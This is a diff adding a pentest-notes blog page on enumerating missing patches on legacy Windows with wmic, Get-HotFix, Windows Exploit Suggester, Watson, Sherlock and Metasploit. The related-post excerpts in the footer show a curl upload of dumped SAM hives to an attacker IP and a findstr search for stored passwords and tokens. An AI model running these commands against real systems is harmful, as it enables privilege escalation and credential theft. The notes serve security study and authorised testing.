@@ -1,0 +1,202 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Legacy OS | Twistzz</title><meta name="author" content="Twistzz"><meta name="copyright" content="Twistzz"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Enumeration Enumerate the installed Windows updates.  12345wmic qfe list brieforGet-HotFix  Windows Exploit Suggester Save the system information for offline analysis.  1systeminfo &gt; sysinfo.txt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Legacy OS">
+<meta property="og:url" content="https://twistzz-ctf.github.io/2026/06/26/Legacy-OS/index.html">
+<meta property="og:site_name" content="Twistzz">
+<meta property="og:description" content="Enumeration Enumerate the installed Windows updates.  12345wmic qfe list brieforGet-HotFix  Windows Exploit Suggester Save the system information for offline analysis.  1systeminfo &gt; sysinfo.txt">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://twistzz-ctf.github.io/images/avatar.png">
+<meta property="article:published_time" content="2026-06-26T16:10:35.000Z">
+<meta property="article:modified_time" content="2026-08-18T23:24:51.091Z">
+<meta property="article:author" content="Twistzz">
+<meta property="article:tag" content="CVE">
+<meta property="article:tag" content="HotFix">
+<meta property="article:tag" content="Legacy-Systems">
+<meta property="article:tag" content="Local-Exploit-Suggester">
+<meta property="article:tag" content="Metasploit">
+<meta property="article:tag" content="Patch-Enumeration">
+<meta property="article:tag" content="Privilege-Escalation">
+<meta property="article:tag" content="Sherlock">
+<meta property="article:tag" content="Watson">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="Windows-Exploit-Suggester">
+<meta property="article:tag" content="Windows-Updates">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://twistzz-ctf.github.io/images/avatar.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Legacy OS",
+  "url": "https://twistzz-ctf.github.io/2026/06/26/Legacy-OS/",
+  "image": "https://twistzz-ctf.github.io/images/avatar.png",
+  "datePublished": "2026-06-26T16:10:35.000Z",
+  "dateModified": "2026-08-18T23:24:51.091Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Twistzz",
+      "url": "https://twistzz-ctf.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/images/favicon.ico"><link rel="canonical" href="https://twistzz-ctf.github.io/2026/06/26/Legacy-OS/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Legacy OS',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 8.1.2"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/images/avatar.png" alt="Logo"><span class="site-name">Twistzz</span></a><a class="nav-page-title" href="/"><span class="site-name">Legacy OS</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div></div></nav><div id="post-info"><h1 class="post-title">Legacy OS</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-06-26T16:10:35.000Z" title="Created 2026-06-26 17:10:35">2026-06-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-08-18T23:24:51.091Z" title="Updated 2026-08-19 00:24:51">2026-08-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Active-Directory/">Active Directory</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Active-Directory/Windows/">Windows</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Active-Directory/Windows/Post-Exploitation/">Post-Exploitation</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Active-Directory/Windows/Post-Exploitation/Windows-Privesc/">Windows Privesc</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Active-Directory/Windows/Post-Exploitation/Windows-Privesc/Old-Systems/">Old Systems</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><blockquote>
+<p>Enumerate the installed Windows updates.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe list brief</span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-HotFix</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Windows-Exploit-Suggester"><a href="#Windows-Exploit-Suggester" class="headerlink" title="Windows Exploit Suggester"></a>Windows Exploit Suggester</h3><blockquote>
+<p>Save the system information for offline analysis.</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo &gt; sysinfo.txt</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Transfer the systeminfo output to our machine and analyze it with <code>windows-exploit-suggester</code></p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python windows-exploit-suggester.py --update</span><br><span class="line"></span><br><span class="line">python windows-exploit-suggester.py --database &lt;database&gt;.xlsx --systeminfo sysinfo.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="Watson"><a href="#Watson" class="headerlink" title="Watson"></a>Watson</h3><blockquote>
+<p>Run Watson to identify missing privilege escalation patches on modern Windows systems.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Watson.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="Sherlock"><a href="#Sherlock" class="headerlink" title="Sherlock"></a>Sherlock</h3><blockquote>
+<p>Run Sherlock to identify missing privilege escalation patches on legacy Windows systems.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\Sherlock.ps1</span><br><span class="line"></span><br><span class="line"><span class="built_in">Find-AllVulns</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Metasploit-Local-Exploit-Suggester"><a href="#Metasploit-Local-Exploit-Suggester" class="headerlink" title="Metasploit Local Exploit Suggester"></a>Metasploit Local Exploit Suggester</h3><blockquote>
+<p>If we have a Meterpreter session we can enumerate applicable local privilege escalation exploits.</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use post/multi/recon/local_exploit_suggester</span><br><span class="line"></span><br><span class="line">msf6 &gt; set SESSION &lt;id&gt;</span><br><span class="line"></span><br><span class="line">msf6 &gt; run</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://twistzz-ctf.github.io">Twistzz</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://twistzz-ctf.github.io/2026/06/26/Legacy-OS/">https://twistzz-ctf.github.io/2026/06/26/Legacy-OS/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Privilege-Escalation/">Privilege-Escalation</a><a class="post-meta__tags" href="/tags/Windows/">Windows</a><a class="post-meta__tags" href="/tags/CVE/">CVE</a><a class="post-meta__tags" href="/tags/Legacy-Systems/">Legacy-Systems</a><a class="post-meta__tags" href="/tags/Watson/">Watson</a><a class="post-meta__tags" href="/tags/Sherlock/">Sherlock</a><a class="post-meta__tags" href="/tags/Windows-Exploit-Suggester/">Windows-Exploit-Suggester</a><a class="post-meta__tags" href="/tags/Metasploit/">Metasploit</a><a class="post-meta__tags" href="/tags/Patch-Enumeration/">Patch-Enumeration</a><a class="post-meta__tags" href="/tags/Local-Exploit-Suggester/">Local-Exploit-Suggester</a><a class="post-meta__tags" href="/tags/Windows-Updates/">Windows-Updates</a><a class="post-meta__tags" href="/tags/HotFix/">HotFix</a></div><div class="post-share"><div class="social-share" data-image="/images/avatar.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/06/26/Windows-Privilege-Escalation-CVEs/" title="Windows Privilege Escalation CVEs"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Windows Privilege Escalation CVEs</div></div><div class="info-2"><div class="info-item-1">CVE-2021-36934 HiveNightmare &#x2F; SeriousSam HiveNightmare allows low-privileged users to read the SAM, SYSTEM, and SECURITY registry hives from Volume Shadow Copies.   Check if the machine is vulnerable.  1icacls C:\Windows\System32\config\SAM   Dump the registry hives using HiveNightmare.  1.\HiveNightmare.exe   Transfer the dumped hives to our machine.  1➜ uploadserver  12345curl.exe -F &quot;files=@SAM&quot; http://&lt;attacker-ip&gt;:8000/uploadcurl.exe -F &quot;files=@SYSTEM&quot; htt...</div></div></div></a><a class="pagination-related" href="/2026/06/26/Pillaging-Windows-Credential-Hunting-Extraction/" title="Pillaging :Windows  Credential Hunting &amp; Extraction"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Pillaging :Windows  Credential Hunting & Extraction</div></div><div class="info-2"><div class="info-item-1">Recursive Credential Search Search recursively for common credential-related keywords.  1cd C:\ &amp; findstr /S /I /M /C:&quot;password&quot; /C:&quot;passwd&quot; /C:&quot;pwd&quot; /C:&quot;secret&quot; /C:&quot;token&quot; /C:&quot;apikey&quot; /C:&quot;api_key&quot; /C:&quot;connectionstring&quot; /C:&quot;connection string&quot; /C:&quot;credential&quot; *.txt *.ini *.config *.xml *.cfg *.conf *.json *.yaml *.yml *.ps1 *.bat   ➜ Remove /M to display the matching lines instead of only th...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/06/26/Windows-Privilege-Escalation-CVEs/" title="Windows Privilege Escalation CVEs"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-26</div><div class="info-item-2">Windows Privilege Escalation CVEs</div></div><div class="info-2"><div class="info-item-1">CVE-2021-36934 HiveNightmare &#x2F; SeriousSam HiveNightmare allows low-privileged users to read the SAM, SYSTEM, and SECURITY registry hives from Volume Shadow Copies.   Check if the machine is vulnerable.  1icacls C:\Windows\System32\config\SAM   Dump the registry hives using HiveNightmare.  1.\HiveNightmare.exe   Transfer the dumped hives to our machine.  1➜ uploadserver  12345curl.exe -F &quot;files=@SAM&quot; http://&lt;attacker-ip&gt;:8000/uploadcurl.exe -F &quot;files=@SYSTEM&quot; htt...</div></div></div></a><a class="pagination-related" href="/2026/06/26/AlwaysInstallElevated/" title="AlwaysInstallElevated"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-26</div><div class="info-item-2">AlwaysInstallElevated</div></div><div class="info-2"><div class="info-item-1"> Windows can be configured to allow MSI packages to be installed with SYSTEM privileges by any user through the AlwaysInstallElevated policy.  Enumeration Check whether the AlwaysInstallElevated policy is enabled.  123reg query HKCU\Software\Policies\Microsoft\Windows\Installerreg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer   If both registry keys contain:  1AlwaysInstallElevated    REG_DWORD    0x1   The system is vulnerable.  Exploitation Generate a malicious MSI payload.  1msf...</div></div></div></a><a class="pagination-related" href="/2026/06/30/Bleeding-Edge-Coercion/" title="Bleeding-Edge &amp; Coercion"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-30</div><div class="info-item-2">Bleeding-Edge &amp; Coercion</div></div><div class="info-2"><div class="info-item-1"> ➜ Everything here needs only a valid domain account yet can jump straight to Domain Admin.  NoPac (CVE-2021-42278 &#x2F; 42287) ➜ NoPac chains two bugs: we rename a machine account we create to match the DC’s name (42278), then request a service ticket after the DC object is restored, so the KDC issues us a ticket as the DC (42287). The result is a SYSTEM shell or a DCSync.  SetupClone NoPac ➜ Clone the exploit repo :  1git clone https://github.com/Ridter/noPac.git  ExploitationScan Whether ...</div></div></div></a><a class="pagination-related" href="/2026/06/30/Credential-Pillaging/" title="Credential Pillaging"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-30</div><div class="info-item-2">Credential Pillaging</div></div><div class="info-2"><div class="info-item-1"> ➜ With valid domain credentials in hand, the next goal is to harvest more credentials : Group Policy Preferences, SYSVOL logon scripts, and Active Directory attributes are the classic places administrators leave passwords behind.  Group Policy Preferences (GPP) ➜ Older versions of Group Policy Preferences stored passwords in the cPassword attribute. Although encrypted, Microsoft publicly released the AES key, so any discovered cPassword value can be decrypted.  LinuxSearch for GPP Passwords ...</div></div></div></a><a class="pagination-related" href="/2026/06/26/Print-Operators/" title="Print Operators"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-26</div><div class="info-item-2">Print Operators</div></div><div class="info-2"><div class="info-item-1"> Print Operators is a Windows privileged group whose members can manage printers and printer drivers on Domain Controllers. This group grants the SeLoadDriverPrivilege, which allows loading kernel drivers. Because kernel drivers run with SYSTEM privileges, this role can be abused to load a vulnerable driver and execute code with full system privileges.  Manual ExploitationConfirm privileges Run whoami /priv to check your current privilege set. What you see depends entirely on how you accessed...</div></div></div></a><a class="pagination-related" href="/2026/06/26/Scheduled-Tasks/" title="Scheduled Tasks"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-26</div><div class="info-item-2">Scheduled Tasks</div></div><div class="info-2"><div class="info-item-1"> Scheduled Tasks automate actions such as backups, maintenance, and system updates, if a task runs with elevated privileges ( SYSTEM ) and executes a script or binary that we can modify, we can inject our own code, wait for the task to execute, and obtain code execution as SYSTEM.  Enumeration Enumerate all scheduled tasks.  1schtasks /query /fo LIST /v   Or via PowerShell.  1Get-ScheduledTask | Select-Object TaskPath, TaskName, State   Inspect a scheduled task to determine the executable or ...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Twistzz</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">71</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">417</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">66</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Twistzz-cb" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumeration"><span class="toc-number">1.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Exploit-Suggester"><span class="toc-number">2.</span> <span class="toc-text">Windows Exploit Suggester</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Watson"><span class="toc-number">3.</span> <span class="toc-text">Watson</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sherlock"><span class="toc-number">4.</span> <span class="toc-text">Sherlock</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Metasploit-Local-Exploit-Suggester"><span class="toc-number">5.</span> <span class="toc-text">Metasploit Local Exploit Suggester</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/07/Abusing-Foreign-Group-Membership/" title="Abusing Foreign Group Membership">Abusing Foreign Group Membership</a><time datetime="2026-07-07T07:29:09.000Z" title="Created 2026-07-07 08:29:09">2026-07-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/06/Forest-Trust-Enumeration/" title="Forest Trust Enumeration">Forest Trust Enumeration</a><time datetime="2026-07-06T14:00:25.000Z" title="Created 2026-07-06 15:00:25">2026-07-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/06/Child-Parent-Trust-Enumeration/" title="Child-Parent Trust Enumeration">Child-Parent Trust Enumeration</a><time datetime="2026-07-06T13:42:32.000Z" title="Created 2026-07-06 14:42:32">2026-07-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/06/Users-Groups/" title="Users &amp; Groups">Users &amp; Groups</a><time datetime="2026-07-06T13:13:08.000Z" title="Created 2026-07-06 14:13:08">2026-07-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/06/Domain-and-ACLs/" title="Domain and ACLs">Domain and ACLs</a><time datetime="2026-07-06T12:24:06.000Z" title="Created 2026-07-06 13:24:06">2026-07-06</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2026 By Twistzz</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><div class="js-pjax"></div><script async data-pjax src="/"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="local-search-input"><input placeholder="Search for Posts" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.2"></script></div></div></body></html>
